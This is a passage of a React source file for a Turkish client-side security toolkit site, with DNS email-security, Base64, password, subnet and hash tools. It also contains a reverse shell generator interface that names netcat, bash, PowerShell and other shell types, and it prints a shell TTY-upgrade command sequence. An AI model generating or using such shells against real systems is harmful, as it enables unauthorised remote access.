        const days = ['Pazar', 'Pazartesi', 'Salı', 'Çarşamba', 'Perşembe', 'Cuma', 'Cumartesi', 'Pazar'];
        return days[parseInt(val)] || val;
      }
      if (type === 'month') {
        const months = ['', 'Ocak', 'Şubat', 'Mart', 'Nisan', 'Mayıs', 'Haziran', 'Temmuz', 'Ağustos', 'Eylül', 'Ekim', 'Kasım', 'Aralık'];
        return months[parseInt(val)] || val;
      }
      return `${val}. ${type === 'min' ? 'dakika' : type === 'hour' ? 'saat' : type === 'day' ? 'gün' : 'ay'}`;
    };

    return `Her ${explainField(month, 'month')}, ayın ${explainField(day, 'day')} günü ve ${explainField(dow, 'dow')} günlerinde; saat ${explainField(hour, 'hour')}, ${explainField(min, 'min')} zamanında çalışır.`;
  };

  // States for Tool 9: Base64 File Converter
  const [b64FileName, setB64FileName] = useState('');
  const [b64FileSize, setB64FileSize] = useState(0);
  const [b64FileType, setB64FileType] = useState('');
  const [b64Encoded, setB64Encoded] = useState('');
  const [b64DecodeText, setB64DecodeText] = useState('');
  const [b64ToolMode, setB64ToolMode] = useState('encode');

  const handleFileSelect = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    setB64FileName(file.name);
    setB64FileSize(file.size);
    setB64FileType(file.type);
    const reader = new FileReader();
    reader.onload = (event) => {
      setB64Encoded(event.target.result);
    };
    reader.readAsDataURL(file);
  };

  const handleBase64Decode = () => {
    try {
      const raw = b64DecodeText.trim().replace(/^data:.*?;base64,/, '');
      const bytes = atob(raw);
      const len = bytes.length;
      const arr = new Uint8Array(len);
      for (let i = 0; i < len; i++) {
        arr[i] = bytes.charCodeAt(i);
      }
      const blob = new Blob([arr], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'cozulen_dosya.bin';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } catch (err) {
      alert('Hata: Geçersiz Base64 formatı!');
    }
  };

  // States for Tool 10: DNS & Email Security Analyzer
  const [dnsDomain, setDnsDomain] = useState('siberkampus.com');
  const [dnsLoading, setDnsLoading] = useState(false);
  const [dnsResults, setDnsResults] = useState(null);

  const runDnsQuery = async () => {
    const dom = dnsDomain.trim().toLowerCase();
    if (!dom) return;
    setDnsLoading(true);
    setDnsResults(null);
    try {
      const fetchRecord = async (type, nameTarget = dom) => {
        const res = await fetch(`https://cloudflare-dns.com/dns-query?name=${nameTarget}&type=${type}`, {
          headers: { 'Accept': 'application/dns-json' }
        });
        const data = await res.json();
        return data.Answer || [];
      };
      const [aRecs, mxRecs, txtRecs, dmarcRecs] = await Promise.all([
        fetchRecord('A'),
        fetchRecord('MX'),
        fetchRecord('TXT'),
        fetchRecord('TXT', `_dmarc.${dom}`)
      ]);
      const spf = txtRecs.find(r => r.data.includes('v=spf1')) || null;
      const dmarc = dmarcRecs.find(r => r.data.includes('v=DMARC1')) || null;
      const risks = [];
      if (!spf) {
        risks.push({
          status: 'TEHLİKELİ',
          color: 'text-red-400 border-red-500/20 bg-red-500/5',
          title: 'SPF Kaydı Eksik',
          desc: 'Bu alan adı adına başkalarının sahte mail göndermesini (mail spoofing) engelleyecek SPF kaydı bulunamadı!'
        });
      } else {
        risks.push({
          status: 'GÜVENLİ',
          color: 'text-emerald-400 border-emerald-500/20 bg-emerald-500/5',
          title: 'SPF Kaydı Aktif',
          desc: `Mail sunucu izni tanımlı: ${spf.data}`
        });
      }
      if (!dmarc) {
        risks.push({
          status: 'RİSKLİ',
          color: 'text-yellow-400 border-yellow-500/20 bg-yellow-500/5',
          title: 'DMARC Politikası Eksik',
          desc: 'SPF/DKIM kontrolleri başarısız olduğunda alıcı sunucunun ne yapacağını belirten DMARC kaydı bulunamadı.'
        });
      } else {
        risks.push({
          status: 'GÜVENLİ',
          color: 'text-emerald-400 border-emerald-500/20 bg-emerald-500/5',
          title: 'DMARC Politikası Aktif',
          desc: `Uygulanan kural: ${dmarc.data}`
        });
      }
      setDnsResults({ a: aRecs, mx: mxRecs, txt: txtRecs, spf, dmarc, risks });
    } catch (e) {
      alert('DNS sorgulanırken hata oluştu.');
    } finally {
      setDnsLoading(false);
    }
  };

  return (
    <>
      <Header navigate={navigate} />
      
      {!slug ? (
        <>
          {/* Main Directory Header */}
          <section className="relative overflow-hidden border-b border-[#0c2719]">
            <div className="absolute top-[-20%] left-1/2 -translate-x-1/2 w-[820px] h-[440px] z-0 pointer-events-none" style={{ background: 'radial-gradient(ellipse at center,rgba(0,255,136,.13),transparent 62%)' }}></div>
            <div className="max-w-[860px] mx-auto px-8 relative z-[2] text-center py-20">
              <span className="font-mono text-[12px] font-medium tracking-[.18em] uppercase text-[#00ff88] inline-flex items-center gap-2.5 mb-4">
                <span className="text-[#5c8a74] font-bold">//</span> Gelişmiş Güvenlik Kitleri
              </span>
              <h1 className="text-[clamp(34px,5vw,52px)] text-[#eafff5] mb-5 font-disp font-bold">Online Siber Güvenlik <span className="text-[#00ff88]">Araçları</span></h1>
              <p className="text-[#74998a] text-base leading-relaxed max-w-[640px] mx-auto">Tamamen tarayıcınızda çalışan, 100% istemci taraflı (client-side) çalışan, SEO dostu ve Türkçe siber güvenlik araç kiti. Bilgileriniz asla sunucularımıza gönderilmez.</p>
            </div>
          </section>

          {/* Grid of Cards */}
          <section className="py-16">
            <div className="max-w-[1080px] mx-auto px-8">
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                {toolsList.map(tool => (
                  <div key={tool.slug} className="rounded-2xl border border-[#0c2719] bg-[rgba(4,16,10,.85)] p-6 hover:border-[#00ff88] transition-all flex flex-col justify-between group">
                    <div>
                      <div className="text-3xl mb-4 p-3 rounded-lg border border-[#103a26] bg-[rgba(0,255,136,.04)] inline-block">{tool.icon}</div>
                      <h3 className="text-xl font-bold text-[#eafff5] group-hover:text-[#00ff88] transition-colors mb-2">{tool.name}</h3>
                      <p className="text-sm text-[#74998a] leading-relaxed mb-6">{tool.desc}</p>
                    </div>
                    <button onClick={() => navigate('tools', { slug: tool.slug })} className="w-full text-center py-3 font-mono text-sm font-bold text-[#021008] bg-[#00ff88] rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all">Aracı Çalıştır →</button>
                  </div>
                ))}
              </div>
            </div>
          </section>
        </>
      ) : (
        /* Inside a tool view */
        <section className="py-10 border-b border-[#0c2719]">
          <div className="max-w-[1280px] mx-auto px-6">
            {/* Breadcrumb */}
            <div className="flex items-center gap-2 text-xs text-[#74998a] mb-6">
              <button onClick={() => navigate('home')} className="hover:text-[#00ff88] transition-colors">Anasayfa</button>
              <span>/</span>
              <button onClick={() => navigate('tools')} className="hover:text-[#00ff88] transition-colors">Güvenlik Araçları</button>
              <span>/</span>
              <span className="text-[#eafff5]">{activeTool ? activeTool.name : ''}</span>
            </div>
            
            <div className="grid grid-cols-1 lg:grid-cols-[280px_1fr] gap-8">
              {/* Sidebar Menu */}
              <div className="space-y-2">
                <div className="hidden lg:block font-mono text-xs uppercase text-[#5c8a74] font-medium tracking-[.12em] mb-4">Araç Kütüphanesi</div>
                <div className="flex flex-row lg:flex-col overflow-x-auto lg:overflow-x-visible gap-2 pb-3 lg:pb-0 border-b border-[#0c2719] lg:border-b-0">
                  {toolsList.map(t => (
                    <button key={t.slug} onClick={() => navigate('tools', { slug: t.slug })} className={`flex items-center gap-3 px-4 py-3 rounded-lg text-left text-sm font-mono transition-all flex-shrink-0 lg:flex-shrink-1 ${t.slug === slug ? 'text-[#00ff88] bg-[rgba(0,255,136,.06)] border border-[#103a26]' : 'text-[#74998a] hover:text-[#cdeede] hover:bg-white/5 border border-transparent'}`}>
                      <span>{t.icon}</span>
                      <span className="truncate">{t.name}</span>
                    </button>
                  ))}
                </div>
                <button onClick={() => navigate('tools')} className="hidden lg:flex items-center justify-center gap-2 w-full mt-6 py-2.5 border border-[#103a26] text-xs font-mono text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] transition-colors rounded-lg">
                  ← Tüm Araçlara Dön
                </button>
              </div>
              
              {/* Tool Screen Pane */}
              <div className="rounded-2xl border border-[#103a26] bg-[rgba(4,16,10,.85)] p-6 md:p-8 min-h-[500px]">
                {slug === 'reverse-shell' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">🔌 Reverse Shell Oluşturucu</h1>
                    <p className="text-[#74998a] text-sm mb-6">Hedef makinede çalıştırılmak üzere dinamik ve etkileşimli reverse shell komut şablonları üretin.</p>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Hedef/Lokal IP Adresi (LHOST)</label>
                        <input value={rsIp} onChange={e => setRsIp(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="10.10.10.10" />
                      </div>
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Dinleyici Portu (LPORT)</label>
                        <div className="flex gap-2">
                          <input value={rsPort} onChange={e => setRsPort(e.target.value)} type="number" className="flex-1 bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="4444" min="1" max="65535" />
                          <button onClick={randomRsPort} className="px-3 border border-[#103a26] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] font-mono text-xs transition-colors rounded-lg">Port Üret</button>
                        </div>
                      </div>
                    </div>
                    
                    {/* Shell payload tabs */}
                    <div className="mb-4">
                      <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Shell payload tipi</label>
                      <div className="flex flex-wrap gap-2">
                        {[
                          { id: 'bash', label: 'Bash' },
                          { id: 'bash-readline', label: 'Bash Readline' },
                          { id: 'nc', label: 'Netcat' },
                          { id: 'nc-openbsd', label: 'Netcat (OpenBSD)' },
                          { id: 'python', label: 'Python' },
                          { id: 'powershell', label: 'PowerShell' },
                          { id: 'php', label: 'PHP' },
                          { id: 'perl', label: 'Perl' },
                          { id: 'ruby', label: 'Ruby' }
                        ].map(s => (
                          <button key={s.id} onClick={() => setRsShell(s.id)} className={`px-3 py-1.5 rounded border text-xs font-mono transition-colors ${rsShell === s.id ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>
                            {s.label}
                          </button>
                        ))}
                      </div>
                    </div>
                    
                    {/* Shell Payload Box */}
                    <div className="relative mb-8">
                      <div className="absolute right-3 top-3 flex items-center gap-2">
                        <button onClick={() => handleCopy(getShellPayload(), 'payload')} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                          {copied === 'payload' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                        </button>
                      </div>
                      <pre className="bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all min-h-[80px]">
                        {getShellPayload()}
                      </pre>
                    </div>

                    {/* Listener Box */}
                    <div className="border-t border-[#0c2719] pt-6">
                      <h3 className="text-lg font-bold text-[#eafff5] mb-2">📥 Dinleyici (Listener) Komutu</h3>
                      <p className="text-[#74998a] text-xs mb-4">Reverse shell bağlantısını karşılamak için lokal makinenizde çalıştırın.</p>
                      
                      <div className="flex gap-2 mb-4">
                        {[
                          { id: 'nc', label: 'nc (Netcat)' },
                          { id: 'rlwrap', label: 'rlwrap nc' },
                          { id: 'ncat', label: 'ncat' },
                          { id: 'socat', label: 'socat' },
                          { id: 'powershell', label: 'PowerShell' }
                        ].map(l => (
                          <button key={l.id} onClick={() => setRsListener(l.id)} className={`px-2.5 py-1.5 rounded border text-xs font-mono transition-all ${rsListener === l.id ? 'bg-[rgba(0,255,136,.06)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>
                            {l.label}
                          </button>
                        ))}
                      </div>
                      
                      <div className="relative mb-6">
                        <div className="absolute right-3 top-3">
                          <button onClick={() => handleCopy(getListenerPayload(), 'listener')} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                            {copied === 'listener' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                          </button>
                        </div>
                        <pre className="bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all">
                          {getListenerPayload()}
                        </pre>
                      </div>

                      <div className="rounded-xl border border-[#103a26] p-4 bg-[rgba(0,255,136,.02)] text-xs text-[#74998a] space-y-2 leading-relaxed">
                        <div className="font-bold text-[#00ff88]">💡 TTY Yükseltme İpucu:</div>
                        <div>Bağlantı geldikten sonra tam etkileşimli (tab tamamlama, yön tuşları, vb.) bir kabuk elde etmek için:</div>
                        <code className="block bg-black/40 p-2 rounded border border-[#103a26] text-[#eafff5] font-mono mt-1">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
                        <div>Ardından sırasıyla: <code className="text-[#00ff88]">Ctrl+Z</code> tuşlayıp bağlantıyı arka plana atın, ardından terminalinize <code className="text-[#eafff5]">stty raw -echo; fg</code> komutunu girip enter tuşlayın.</div>
                      </div>
                    </div>
                  </div>
                )}

                {slug === 'encoder-decoder' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">🔐 Akıllı Cyber Encoder/Decoder</h1>
                    <p className="text-[#74998a] text-sm mb-6">Farklı kodlama biçimleri (Base64, URL, Hex, Binary, HTML) arasında metinlerinizi anlık olarak dönüştürün.</p>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                      <div>
                        <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">Dönüştürme Formatı</label>
                        <select value={encFormat} onChange={e => setEncFormat(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm">
                          <option value="base64">Base64 (Metin standardı)</option>
                          <option value="url">URL Encoding (Web URL parametreleri)</option>
                          <option value="hex">Hexadecimal (Onaltılık taban)</option>
                          <option value="binary">Binary (İkilik taban - 8-bit)</option>
                          <option value="html">HTML Entities (Özel karakter kodlama)</option>
                        </select>
                      </div>
                      <div>
                        <label className="block text-xs font-mono uppercase text-[#5c8a74] mb-2">İşlem Yönü</label>
                        <div className="grid grid-cols-2 gap-2">
                          <button onClick={() => setEncMode('encode')} className={`py-2 border font-mono text-xs rounded-lg transition-colors ${encMode === 'encode' ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>Kodla (Encode)</button>
                          <button onClick={() => setEncMode('decode')} className={`py-2 border font-mono text-xs rounded-lg transition-colors ${encMode === 'decode' ? 'bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]' : 'border-[#103a26] text-[#74998a] hover:text-[#cdeede]'}`}>Kodu Çöz (Decode)</button>
                        </div>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch mb-6">
                      <div className="flex flex-col">
                        <div className="flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2">
                          <span>Girdi Metni</span>
                          <span>{encText.length} karakter</span>
                        </div>
                        <textarea value={encText} onChange={e => setEncText(e.target.value)} rows="8" className="w-full flex-1 bg-[#020806] border border-[#103a26] rounded-xl p-4 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm resize-none" placeholder="Şifrelenecek veya kodu çözülecek metni yazın…"></textarea>
                      </div>
                      
                      <div className="flex flex-col">
                        <div className="flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2">
                          <span>Çıktı Metni</span>
                          <span>{encResult.length} karakter</span>
                        </div>
                        <div className="relative flex-1 flex flex-col">
                          <textarea readOnly value={encResult} rows="8" className="w-full flex-1 bg-[#020806] border border-[#103a26] rounded-xl p-4 text-[#00ff88] focus:outline-none font-mono text-sm resize-none" placeholder="Sonuç burada belirecektir…"></textarea>
                          <div className="absolute right-3 bottom-3 flex gap-2">
                            <button onClick={swapEncoder} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                              Swap 🔁
                            </button>
                            <button onClick={() => handleCopy(encResult, 'encoder')} className="px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors">
                              {copied === 'encoder' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {slug === 'password-strength' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">🔑 Parola Güvenliği & Entropi Analizörü</h1>
                    <p className="text-[#74998a] text-sm mb-6">Şifrenizin kaba kuvvet (brute force) saldırılarına karşı ne kadar süre dayanacağını hesaplayın ve güvenli şifreler oluşturun.</p>
                    
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                      {/* Left side: Calculator */}
                      <div>
                        <h3 className="text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">Parola Analizcisi</h3>
                        
                        <div className="mb-4">
                          <label className="block text-sm text-[#cdeede] mb-2 font-mono">Test Edilecek Şifre</label>
                          <div className="relative">
                            <input type={showPass ? "text" : "password"} value={passInput} onChange={e => setPassInput(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg pl-4 pr-12 py-3 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="Şifrenizi yazın…" />
                            <button onClick={() => setShowPass(o => !o)} className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-[#74998a] hover:text-[#00ff88] font-mono">
                              {showPass ? 'Gizle' : 'Göster'}
                            </button>
                          </div>
                        </div>

                        {passAnalysis ? (
                          <div className="space-y-4">
                            {/* Entropy bar */}
                            <div className="space-y-1">
                              <div className="flex justify-between text-xs font-mono">
                                <span className="text-[#74998a]">Entropi Gücü:</span>
                                <span className="text-[#00ff88] font-bold">{passAnalysis.entropy} bits</span>
                              </div>
                              <div className="h-2.5 rounded-full bg-[#0c2719] overflow-hidden">
                                <div className="h-full rounded-full transition-all duration-300 bg-gradient-to-r from-red-500 via-yellow-400 to-[#00ff88]" style={{ width: `${Math.min(100, (passAnalysis.entropy / 128) * 100)}%` }}></div>
                              </div>
                              <div className={`mt-2 border rounded-lg p-3 text-sm font-mono text-center font-bold ${passAnalysis.color}`}>
                                Derece: {passAnalysis.level}
                              </div>
                            </div>

                            {/* Pools checklist */}
                            <div className="rounded-xl border border-[#0c2719] p-4 bg-[#020806] text-xs font-mono space-y-2">
                              <div className="text-[#5c8a74] border-b border-[#0c2719] pb-1.5 uppercase font-bold">Karakter Analizi</div>
                              <div className="flex justify-between">
                                <span>[a-z] Küçük Harf:</span>
                                <span className={passAnalysis.hasLower ? 'text-[#00ff88]' : 'text-red-500'}>{passAnalysis.hasLower ? '✓ Var' : '✗ Yok'}</span>
                              </div>
                              <div className="flex justify-between">
                                <span>[A-Z] Büyük Harf:</span>
                                <span className={passAnalysis.hasUpper ? 'text-[#00ff88]' : 'text-red-500'}>{passAnalysis.hasUpper ? '✓ Var' : '✗ Yok'}</span>
                              </div>
                              <div className="flex justify-between">
                                <span>[0-9] Rakam:</span>
                                <span className={passAnalysis.hasNumber ? 'text-[#00ff88]' : 'text-red-500'}>{passAnalysis.hasNumber ? '✓ Var' : '✗ Yok'}</span>
                              </div>
                              <div className="flex justify-between">
                                <span>[!@#$] Özel Karakter:</span>
                                <span className={passAnalysis.hasSymbol ? 'text-[#00ff88]' : 'text-red-500'}>{passAnalysis.hasSymbol ? '✓ Var' : '✗ Yok'}</span>
                              </div>
                              <div className="flex justify-between border-t border-[#0c2719] pt-1.5 text-[#cdeede]">
                                <span>Toplam Karakter Havuzu:</span>
                                <span>{passAnalysis.poolSize}</span>
                              </div>
                            </div>

                            {/* Crack times table */}
                            <div className="rounded-xl border border-[#0c2719] p-4 bg-[#020806] text-xs font-mono space-y-2">
                              <div className="text-[#5c8a74] border-b border-[#0c2719] pb-1.5 uppercase font-bold">Kırılma Süresi Tahminleri</div>
                              <div className="flex justify-between">
                                <span>Web Giriş Saldırısı (100 tahmin/sn):</span>
                                <span className="text-orange-400 font-bold">{formatTime(passAnalysis.crackTimes.online)}</span>
                              </div>
                              <div className="flex justify-between">
                                <span>Lokal Standart CPU (1M tahmin/sn):</span>
                                <span className="text-yellow-400 font-bold">{formatTime(passAnalysis.crackTimes.offlineSlow)}</span>
                              </div>
                              <div className="flex justify-between">
                                <span>Profesyonel GPU Kümesi (10B tahmin/sn):</span>
                                <span className="text-red-400 font-bold">{formatTime(passAnalysis.crackTimes.offlineFast)}</span>
                              </div>
                            </div>
                          </div>
                        ) : (
                          <div className="text-center py-10 border border-dashed border-[#103a26] rounded-xl text-sm text-[#74998a] font-mono">
                            Analiz etmek için şifre girin.
                          </div>
                        )}
                      </div>

                      {/* Right side: Password Generator */}
                      <div>
                        <h3 className="text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">Güvenli Şifre Oluşturucu</h3>
                        
                        <div className="space-y-4">
                          <div>
                            <div className="flex justify-between text-sm text-[#cdeede] font-mono mb-2">
                              <span>Şifre Uzunluğu:</span>
                              <span className="text-[#00ff88] font-bold">{genLen} karakter</span>
                            </div>
                            <input type="range" min="6" max="64" value={genLen} onChange={e => setGenLen(parseInt(e.target.value))} className="w-full accent-[#00ff88]" />
                          </div>

                          <div className="space-y-2 border border-[#0c2719] rounded-xl p-4 bg-[#020806]">
                            <label className="flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer">
                              <input type="checkbox" checked={genLower} onChange={e => setGenLower(e.target.checked)} className="rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" />
                              Küçük Harf [a-z]
                            </label>
                            <label className="flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer">
                              <input type="checkbox" checked={genUpper} onChange={e => setGenUpper(e.target.checked)} className="rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" />
                              Büyük Harf [A-Z]
                            </label>
                            <label className="flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer">
                              <input type="checkbox" checked={genNum} onChange={e => setGenNum(e.target.checked)} className="rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" />
                              Sayılar [0-9]
                            </label>
                            <label className="flex items-center gap-2.5 text-sm font-mono text-[#74998a] hover:text-[#eafff5] cursor-pointer">
                              <input type="checkbox" checked={genSym} onChange={e => setGenSym(e.target.checked)} className="rounded border-[#103a26] text-[#00ff88] focus:ring-0 focus:ring-offset-0 bg-transparent w-4 h-4" />
                              Özel Karakterler (!@#$)
                            </label>
                          </div>

                          <button onClick={handleGeneratePass} className="w-full py-3 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all">Şifre Üret ⚡</button>

                          {genResult && (
                            <div className="relative">
                              <input readOnly value={genResult} className="w-full bg-[#020806] border border-[#103a26] rounded-lg pl-4 pr-12 py-3.5 text-[#00ff88] font-mono text-sm focus:outline-none" />
                              <button onClick={() => handleCopy(genResult, 'genPass')} className="absolute right-3 top-1/2 -translate-y-1/2 px-2 py-1 bg-black border border-[#103a26] hover:border-[#00ff88] text-xs font-mono text-[#00ff88] rounded transition-all">
                                {copied === 'genPass' ? '✓ Kopyalandı!' : '📋 Kopyala'}
                              </button>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {slug === 'subnet-calc' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">🌐 CIDR & Subnet Hesaplayıcı</h1>
                    <p className="text-[#74998a] text-sm mb-6">IP adresinizi ve alt ağ maskenizi (CIDR) girerek, ağ yapılandırmalarını ve binary hizalamalarını live hesaplayın.</p>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">IP Adresi</label>
                        <input value={subnetIp} onChange={e => setSubnetIp(e.target.value)} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" placeholder="192.168.1.1" />
                      </div>
                      <div>
                        <label className="block text-sm text-[#cdeede] mb-2 font-mono">Alt Ağ Maskesi (CIDR)</label>
                        <select value={subnetCidr} onChange={e => setSubnetCidr(parseInt(e.target.value))} className="w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm">
                          {Array.from({ length: 33 }).map((_, i) => {
                            const mask = i === 0 ? 0 : (~0 << (32 - i)) >>> 0;
                            const maskStr = [
                              (mask >>> 24) & 255,
                              (mask >>> 16) & 255,
                              (mask >>> 8) & 255,
                              mask & 255
                            ].join('.');
                            return (
                              <option key={i} value={i}>/{i} ({maskStr})</option>
                            );
                          })}
                        </select>
                      </div>
                    </div>

                    {subnetResult.error ? (
                      <div className="border border-red-500/20 bg-red-500/5 text-red-500 p-4 rounded-xl text-center text-sm font-mono">
                        {subnetResult.error}
                      </div>
                    ) : (
                      <div className="space-y-6">
                        {/* Results Grid */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                          {[
                            { label: 'Ağ Adresi (Network IP)', val: subnetResult.netAddr },
                            { label: 'Yayım Adresi (Broadcast IP)', val: subnetResult.broadAddr },
                            { label: 'Alt Ağ Maskesi (Subnet Mask)', val: subnetResult.netMask },
                            { label: 'Kullanılabilir IP Aralığı', val: `${subnetResult.firstUsable} - ${subnetResult.lastUsable}` },
                            { label: 'Kullanılabilir Cihaz Sayısı', val: subnetResult.usableHosts.toLocaleString('tr-TR') },
                            { label: 'IP Sınıfı (Class)', val: subnetResult.ipClass }
                          ].map((res, i) => (
                            <div key={i} className="border border-[#0c2719] bg-[#020806] rounded-xl p-4 font-mono">
                              <div className="text-[10px] text-[#74998a] uppercase tracking-wider mb-1">{res.label}</div>
                              <div className="text-sm font-bold text-[#eafff5] select-all">{res.val}</div>
                            </div>
                          ))}
                        </div>

                        {/* Binary visualization */}
                        <div className="border border-[#103a26] bg-black/40 rounded-xl p-5 font-mono text-xs">
                          <h3 className="text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">Binary Görselleştirme</h3>
                          
                          <div className="space-y-3">
                            <div className="grid grid-cols-[80px_1fr] gap-4 items-center">
                              <span className="text-[#74998a]">IP Adresi:</span>
                              <div className="text-[13px] tracking-wide select-all">
                                {formatBin(subnetResult.ipBin, subnetCidr)}
                              </div>
                            </div>
                            <div className="grid grid-cols-[80px_1fr] gap-4 items-center border-t border-[#0c2719]/40 pt-3">
                              <span className="text-[#74998a]">Alt Ağ:</span>
                              <div className="text-[13px] tracking-wide select-all">
                                {formatBin(subnetResult.maskBin, subnetCidr)}
                              </div>
                            </div>
                          </div>

                          <div className="mt-5 pt-3 border-t border-[#0c2719] flex items-center gap-4 text-[10px] text-[#74998a]">
                            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded bg-[#00ff88]"></span>Ağ Segmenti (Network Bitleri)</span>
                            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded bg-[#547464]"></span>Cihaz Segmenti (Host Bitleri)</span>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {slug === 'hash-tool' && (
                  <div>
                    <h1 className="text-2xl font-bold text-[#eafff5] mb-2">🧮 Hash Oluşturucu ve Tanımlayıcı</h1>
                    <p className="text-[#74998a] text-sm mb-6">Verilerinizin MD5, SHA-1, SHA-256 ve SHA-512 özet çıktılarını oluşturun veya bilinmeyen hash formatlarını tespit edin.</p>
                    
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                      {/* Left: Generator */}
                      <div>
                        <h3 className="text-lg font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2">Hash Oluşturucu</h3>
                        
                        <div className="space-y-4">
                          <div>
                            <label className="block text-sm text-[#cdeede] mb-2 font-mono">Girdi Verisi (Metin)</label>
                            <textarea value={hashInput} onChange={e => setHashInput(e.target.value)} rows="3" className="w-full bg-[#020806] border border-[#103a26] rounded-lg p-3 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-sm resize-none" placeholder="Hash çıktısı üretmek istediğiniz metni girin…"></textarea>
                          </div>

                          <div className="space-y-3.5">
                            {[
                              { label: 'MD5', val: hMd5 },
                              { label: 'SHA-1', val: hSha1 },
                              { label: 'SHA-256', val: hSha256 },
                              { label: 'SHA-512', val: hSha512 }
                            ].map((h, i) => (
                              <div key={i} className="border border-[#0c2719] bg-[#020806] rounded-xl p-3 font-mono relative">
                                <div className="text-[10px] text-[#74998a] uppercase mb-1">{h.label}</div>
                                <div className="text-xs font-bold text-[#00ff88] select-all break-all pr-12 min-h-[16px]">
                                  {h.val || ''}
                                </div>
                                {h.val && (
